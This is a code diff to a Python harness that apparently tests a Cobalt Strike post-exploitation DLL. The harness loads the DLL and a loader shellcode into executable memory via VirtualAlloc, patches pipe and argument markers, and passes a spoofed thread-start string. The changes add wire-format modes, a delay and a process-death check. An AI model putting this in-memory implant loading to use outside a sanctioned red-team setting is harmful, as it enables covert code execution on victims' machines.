@@ -54,9 +54,19 @@ if __name__ == "__main__":
         "sys.path.insert(0, r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-beacon\\feat-post-4.9.1\\tools')\n"
         "import kit_local_harness2 as H\n"
         "CTRL = sys.argv[1]; OUT = sys.argv[2]\n"
+        "import os as _os\n"
+        "_m = _os.environ.get('KIT_WIRE_MODE', 'cb')\n"
+        "if _m == 'headless':\n"
+        "    _wire = H.FULL[8:] + struct.pack('>i',0)\n"
+        "elif _m == 'pad20':\n"
+        "    _wire = b'\\x00' * 12 + H.FULL + struct.pack('>i',0)\n"
+        "elif _m == 'kitfull':\n"
+        "    _wire = open(r'C:\\\\Users\\\\Public\\\\bt_hello_kitfull_wire.bin','rb').read() + struct.pack('>i',0)\n"
+        "else:\n"
+        "    _wire = H.FULL + struct.pack('>i',0)\n"
         "ARGS = (struct.pack('>i',1)+struct.pack('>i',2)+struct.pack('>i',1)"
         "+H.L(b'ntdll.dll!RtlUserThreadStart+0x21\\x00')"
-        "+H.L(OUT.encode()+b'\\x00')+H.L(H.FULL + struct.pack('>i',0)))\n"
+        "+H.L(OUT.encode()+b'\\x00')+H.L(_wire))\n"
         "PIPEMARK = b'POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE'\n"
         "FULLPIPE_MARK = b'\\\\\\\\.\\\\pipe\\\\' + PIPEMARK\n"
         "ARGSMARK = b'_POSTEX_ARGUMENTS_'\n"
@@ -75,7 +85,7 @@ if __name__ == "__main__":
         "    return bytes(d)\n"
         "k32 = ctypes.windll.kernel32\n"
         "k32.VirtualAlloc.restype = ctypes.c_void_p\n"
-        "dll = patch_kit(open(r'C:\\Users\\Public\\kit_async.x64.dll', 'rb').read())\n"
+        "dll = patch_kit(open(r'C:\\Users\\Public\\kit_async_int3.x64.dll', 'rb').read())\n"
         "loader = open(r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-ts\\p3-llvm-bench\\src\\main\\resources\\resources\\postex-loader.x64.bin', 'rb').read()\n"
         "blob = loader + dll\n"
         "base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)\n"
@@ -113,6 +123,7 @@ if __name__ == "__main__":
         "CTRL, OUT = sys.argv[1], sys.argv[2]\n"
         "hc = open_pipe(CTRL, 20)\n"
         "print('ctrl connected:', hc is not None, flush=True)\n"
+        "time.sleep(8)\n"
         "ho = open_pipe(OUT, 60)\n"
         "print('out connected:', ho is not None, flush=True)\n"
         "if not ho:\n"
@@ -145,9 +156,11 @@ if __name__ == "__main__":
         p2.wait(timeout=140)
     except Exception:
         p2.kill()
+    dead = p.poll() is not None
     try:
         p.kill()
     except Exception:
         pass
+    print("CHILD DIED EARLY:", dead)
     print("=== PARENT ===")
     print(p2.stdout.read().decode(errors="replace")[:1500])
